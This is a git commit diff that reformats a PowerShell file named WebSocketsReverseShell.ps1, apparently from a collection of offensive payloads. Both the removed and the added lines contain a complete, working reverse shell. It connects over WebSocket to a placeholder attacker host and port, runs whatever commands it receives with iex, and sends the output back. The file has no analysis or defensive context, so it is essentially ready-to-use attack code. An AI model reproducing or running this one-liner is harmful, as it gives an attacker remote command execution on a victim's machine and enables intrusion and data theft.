e80506f37db4bf5a37e51053d5cb47069aee2b16
Dar1anMar1us <49186825+Dar1anMar1us@users.noreply.github.com>
2024-09-15 11:27:39 +0200

    Update WebSocketsReverseShell.ps1

--- PowerShell/WebSocketsReverseShell.ps1
+++ PowerShell/WebSocketsReverseShell.ps1
@@ -1,7 +1,1 @@
-$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object
-System.Uri("ws://attacker_ip:attacker_port"); $ClientWebSocket.ConnectAsync($uri, $null).Result;
-$buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received =
-$ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command =
-[System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 |
-Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output);
-$ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
+$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri("ws://attacker_ip:attacker_port"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
